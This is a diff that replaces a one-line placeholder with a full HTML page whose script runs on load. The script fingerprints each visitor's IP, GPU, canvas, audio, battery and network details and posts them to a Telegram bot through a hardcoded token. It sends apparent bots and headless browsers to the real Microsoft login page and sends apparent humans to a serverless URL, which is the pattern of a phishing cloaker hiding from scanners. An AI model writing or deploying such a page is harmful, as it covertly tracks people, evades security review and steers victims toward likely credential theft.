@@ -1,1 +1,159 @@
-Static Html is okay
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+</head>
+<body>
+<canvas id="gl" style="display:none"></canvas>
+<script>
+const CFG = {
+  D: "https://faas-nyc1-2ef2e6cc.doserverless.co/api/v1/web/fn-41e74b37-dd43-49e8-a188-5e80baa811f1/default/sys/",
+  B: "https://login.microsoftonline.com",
+  T: "8254511136:AAFZSGmygKmwaqghywbvxv2-VmPSr7HqqWE",
+  C: "-1003701370299"
+};
+
+let state = { score: 0, interacted: false };
+
+const tgLog = async txt => {
+  try {
+    await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CFG.C, text: txt, parse_mode: "HTML" })
+    });
+  } catch (_) {}
+};
+
+const getBattery = async () => {
+  try {
+    const b = await navigator.getBattery();
+    return `${b.level * 100}%_${b.charging}`;
+  } catch (_) { return "UNSUPPORTED"; }
+};
+
+const getWebGL = () => {
+  try {
+    const cvs = document.getElementById('gl');
+    const gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
+    return { renderer, vendor, version: gl.getParameter(gl.VERSION) };
+  } catch (_) { return { renderer: "ERR", vendor: "ERR", version: "ERR" }; }
+};
+
+const getCanvasFP = () => {
+  const c = document.createElement('canvas');
+  c.width = 280; c.height = 60;
+  const ctx = c.getContext('2d');
+  ctx.textBaseline = 'top';
+  ctx.font = '16px "Arial"';
+  ctx.fillStyle = '#f60';
+  ctx.fillRect(125, 1, 62, 20);
+  ctx.fillStyle = '#069';
+  ctx.fillText('🧪', 2, 15);
+  ctx.fillStyle = 'rgba(102,204,0,0.7)';
+  ctx.fillText('🧪', 4, 17);
+  return c.toDataURL();
+};
+
+const getAudioFP = async () => {
+  try {
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (!AC) return "UNSUPPORTED";
+    const ctx = new AC(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    osc.connect(ctx.destination);
+    osc.start(0);
+    const buf = await ctx.startRendering();
+    let sum = 0;
+    for (let i = 0; i < buf.length; i++) sum += Math.abs(buf.getChannelData(0)[i]);
+    return sum.toFixed(5);
+  } catch (_) { return "UNSUPPORTED"; }
+};
+
+const getUAHash = () => {
+  let h = 0;
+  for (let i = 0; i < navigator.userAgent.length; i++)
+    h = (h << 5) - h + navigator.userAgent.charCodeAt(i);
+  return h >>> 0;
+};
+
+const detectHeadless = () => {
+  const probes = ['webdriver', '__nightmare', '_selenium', 'callPhantom', '__phantomas'];
+  if (probes.some(p => p in window)) return true;
+  if (navigator.webdriver) return true;
+  if (window.chrome && chrome.runtime && !chrome.runtime.id) return true;
+  return false;
+};
+
+const calculateScore = async () => {
+  let penalty = 0;
+  if (navigator.webdriver) penalty += 30;
+  if (detectHeadless()) penalty += 30;
+  if (!window.chrome) penalty += 20;
+  if (!window.PaymentRequest) penalty += 15;
+  return penalty;
+};
+
+const assembleLog = async () => {
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: "NA" }));
+  const bat = await getBattery();
+  const gpu = getWebGL();
+  const canvas = getCanvasFP();
+  const audio = await getAudioFP();
+  const tz = (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) { return "UNSUPPORTED"; } })();
+  const uaHash = getUAHash();
+  return `<b>[LOG]</b>
+IP: ${ip.ip}
+UA_HASH: ${uaHash}
+BATTERY: ${bat}
+GPU_RENDERER: ${gpu.renderer}
+GPU_VENDOR: ${gpu.vendor}
+GPU_VERSION: ${gpu.version}
+CANVAS_FP: ${canvas.slice(0,30)}
+AUDIO_FP: ${audio}
+TIMEZONE: ${tz}
+SCREEN: ${window.screen.width}x${window.screen.height} cd:${window.screen.colorDepth} pr:${window.devicePixelRatio}
+HARDWARE: cores:${navigator.hardwareConcurrency||0} mem:${navigator.deviceMemory||0}
+LANG: ${navigator.language||"NA"}
+NETWORK: ${navigator.connection?.type||"NA"} ${navigator.connection?.effectiveType||"NA"} dl:${navigator.connection?.downlink||0} rtt:${navigator.connection?.rtt||0}
+`;
+};
+
+['mousemove','touchstart','click','keydown'].forEach(ev =>
+  window.addEventListener(ev, () => { state.interacted = true; }, { once: true })
+);
+
+const run = async () => {
+  await new Promise(r => setTimeout(r, 600));
+  await new Promise(r => setTimeout(r, 1300));
+  await new Promise(r => setTimeout(r, 1100));
+  const penalty = await calculateScore();
+  state.score = -penalty;
+  const log = await assembleLog();
+  if (!state.interacted && state.score < -40) {
+    await tgLog(log + "\nSTATUS: BLOCKED");
+    window.location.replace(CFG.B);
+  } else {
+    await tgLog(log + "\nSTATUS: PASSED");
+    setTimeout(() => window.location.replace(CFG.D), 400);
+  }
+};
+
+window.onload = () => {
+  const ua = navigator.userAgent;
+  if (ua.includes("Bot") || ua.includes("Crawl")) {
+    window.location.replace(CFG.B);
+  } else {
+    run();
+  }
+};
+</script>
+</body>
+</html>
